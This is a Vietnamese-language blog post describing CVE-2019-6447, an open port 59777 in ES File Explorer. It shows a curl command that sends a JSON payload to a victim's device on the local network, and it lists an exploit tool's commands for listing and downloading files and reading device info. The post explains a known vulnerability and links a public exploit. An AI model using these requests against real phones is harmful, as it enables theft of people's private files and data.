---
title: CVE-2019-6447
date: 29/06/2021
layout: single
header:
  teaser: /assets/images/cve.PNG
--- 


## Mô Tả 
Lỗ hổng mở cổng của ES File Explorer - CVE-2019-6447

ES File Explorer (Trình quản lý tệp) là một trình quản lý tệp (Hình ảnh, Nhạc, Phim, Tài liệu, ứng dụng) đầy đủ tính năng cho cả việc sử dụng cục bộ và mạng! Với hơn 500 triệu người dùng trên toàn thế giới, ES File Explorer (Trình quản lý tệp) giúp quản lý điện thoại Android và các tệp của bạn một cách hiệu quả và hiệu quả, đồng thời chia sẻ tệp mà không tốn dữ liệu.
 
Mỗi khi người dùng khởi chạy ứng dụng, máy chủ HTTP sẽ được khởi động. Máy chủ này đang mở cục bộ cổng 59777

```shell 
angler:/ # netstat -ap | grep com.estrongs
tcp6       0      0 :::59777                :::*                    LISTEN      5696/com.estrongs.android.pop

```
Trên cổng này, kẻ tấn công có thể gửi tải trọng JSON đến mục tiêu
```shell
curl --header "Content-Type: application/json" --request POST --data '{"command":"[my_awesome_cmd]"}' http://192.168.0.108:59777

```
Các lệnh này cho phép kẻ tấn công kết nối trên cùng một mạng cục bộ với nạn nhân, có được nhiều thông tin hấp dẫn (thông tin thiết bị, ứng dụng đã cài đặt, ...) về điện thoại của nạn nhân, lấy từ xa một tệp từ điện thoại của nạn nhân và khởi chạy từ xa ứng dụng trên điện thoại của nạn nhân.

## Các phiên bản bị ảnh hưởng
4.1.9.7.4 trở xuống

## Tính năng công cụ 
+ listFiles: Liệt kê tất cả các Tệp.
+ listPics: Liệt kê tất cả các Ảnh.
+ listVideos: Liệt kê tất cả các video.
+ listAudios: Liệt kê tất cả các âm thanh.
+ listApps: Liệt kê các ứng dụng đã cài đặt.
+ listAppsSystem: Liệt kê các ứng dụng Hệ thống.
+ listAppsPhone: Liệt kê các ứng dụng liên quan đến Giao tiếp.
+ listAppsSdcard: Liệt kê các ứng dụng trên thẻ SDCard.
+ listAppsAll: Liệt kê tất cả Ứng dụng.
+ getFile: Tải xuống tệp.
+ getDeviceInfo: Nhận thông tin thiết bị.

[![Language](https://img.shields.io/badge/Lang-python-blue.svg)](https://www.python.org/)

Mã khai thác của tác giả Nehal Zaman [CVE-2019-6447](https://www.exploit-db.com/exploits/50070)


```shell
C:\Users\Administrator\Documents\python>python 15.py cmd ip 

Available commands :
  listFiles         : List all Files.
  listPics          : List all Pictures.
  listVideos        : List all videos.
  listAudios        : List all audios.
  listApps          : List Applications installed.
  listAppsSystem    : List System apps.
  listAppsPhone     : List Communication related apps.
  listAppsSdcard    : List apps on the SDCard.
  listAppsAll       : List all Application.
  getFile           : Download a file.
  getDeviceInfo     : Get device info.

```

## Cảm ơn :D
